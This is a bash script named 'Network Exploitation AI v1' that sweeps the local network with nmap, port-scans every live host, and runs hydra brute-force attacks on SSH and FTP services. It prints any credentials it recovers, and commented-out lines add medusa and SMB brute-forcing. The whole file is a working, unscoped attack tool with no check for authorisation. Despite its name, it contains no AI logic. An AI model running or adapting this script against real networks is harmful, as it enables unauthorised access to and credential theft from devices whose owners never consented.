#!/bin/bash

printf "[i] Checking network connection...\n"

if ! ping -q -c1 google.com &>/dev/null
then
    printf "[!] No network! Aborting...\n" && exit
fi

network_ssid=$(iwgetid -r)
gateway=$(ip route | grep -v 'default' | awk '{print $1}')
wordlist="/usr/share/wordlists/dirb/small.txt"
localhost=$(ifconfig | grep -Eo 'inet (addr:)?([0-9]*\.){3}[0-9]*' | grep -Eo '([0-9]*\.){3}[0-9]*' | grep -v '127.0.0.1')

clear
printf '   _  __    __  ___   ____
  / |/ /__ / /_/ _ | /  _/
 /    / -_) __/ __ |_/ /  
/_/|_/\__/\__/_/ |_/___/  
---------------------------
Network Exploitation AI v1
---------------------------
'

printf "[i] Found network SSID:%s $network_ssid\n"
printf "[i] Found network gateway:%s $gateway\n"
printf "[*] Scanning entire network...\n"
printf "[i] Found localhost: $localhost, whitelisting...\n"



# ips=($(nmap -sn  $gateway | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' | sort)) #ips array
mapfile -t ips < <(nmap -sn "$gateway" | awk '/is up/ {print up}; {gsub (/\(|\)/,""); up = $NF}' | sort)
ips=(${ips[@]/$localhost})

# nmap -vv $ips[$i] | grep "Discovered open port" | awk {'print $6":"$4'} | awk -F/ {'print $1'} 

# printf "${ips[@]}"

if [ ${#ips[@]} -eq "0" ]
then 
    printf "\n[!] No IPs found!"
    exit
fi

printf "[i] Found \e[92m%s${#ips[@]}\e[0m IPs!\n"

for i in "${ips[@]}"
do
    printf "%s\n$i"
done

printf "\n\n[*] Scanning IPs for open ports...\n"

i=0

while [ $i -lt ${#ips[@]} ]
do
    printf "\n[*] Scanning ip %s($((i+1))/${#ips[@]}) - ${ips[$i]}...\n"
    # printf "[i] IP %s${ips[$i]} have ${#ports[$i]} open ports"
    
    mapfile -t ports < <(nmap -vv "${ips[$i]}" | grep "Discovered open port" | awk '{print $6":"$4}' | awk -F: '{print $2}' | grep -o '[0-9]\+')  
    # ports output is - port!!
    if [ ${#ports[@]} -gt 0 ]
    then
        printf "[i] Host have\e[92m %s${#ports[@]}\e[0m open ports [\e[94m %s${ports[*]}\e[0m ]"
        printf "\n[*] Checking services & running modules...\n"
    else
        printf "[i] Host have\e[91m %s${#ports[@]}\e[0m open ports"
    fi
    
    # for i in ${ports[$y]}
    # do
    # printf "\n[*] Attepting to bruteforce services...\n"
    # done
    

    y=0
    while [ $y -lt ${#ports[*]} ]
    do
   # count=$(ls modules/${ports[$y]}/ -1q | wc -l)
        
         if [ "${ports[$y]}" == "80" ]
            then
                printf "[i] \e[92mHTTP\e[0m service detected!\n"
            elif [ "${ports[$y]}" == "22" ]
            then 
                printf "[i] \e[92mSSH\e[0m service detected!\n"
                hydra -L user.txt -P pass.txt -I "${ips[$i]}" ssh -f -o brute.txt
                printf "[i] CREDINENTIALS:\n\e[94m"	
                cat brute.txt | awk '/login/{print $3" "$5":" $7}'
                printf "\e[0m" 
                read -p "Press [ENTER] to continue!"
            elif [ "${ports[$y]}" == "443" ]
            then 
                printf "[i] \e[92mHTTPS\e[0m service detected!\n"

            elif [ "${ports[$y]}" == "21" ]
            then 
                printf "[i] \e[92mFTP\e[0m service detected!\n"
                hydra -L user.txt -P pass.txt -I "${ips[$i]}" ftp -f -o brute.txt
                #default dictionary attack
                # medusa -h "${ips[$i]}" -u admin -P $wordlist -M ftp

                

            elif [ "${ports[$y]}" == "23" ]
            then 
                printf "[i] \e[92mTELNET\e[0m service detected!\n"
            elif [ "${ports[$y]}" == "445" ]

            then 
                printf "[i] \e[92mSMB\e[0m service detected!\n"
                #   hydra -t 1 -V -f -L user.txt -P pass.txt "${ips[$i]}" smb

            else
                printf "[!] Service on port \e[94m%s${ports[$y]}\e[0m is not supported yet! Skipping...\n"
            fi
        y=$((y+1))
    done

    i=$((i+1))

done
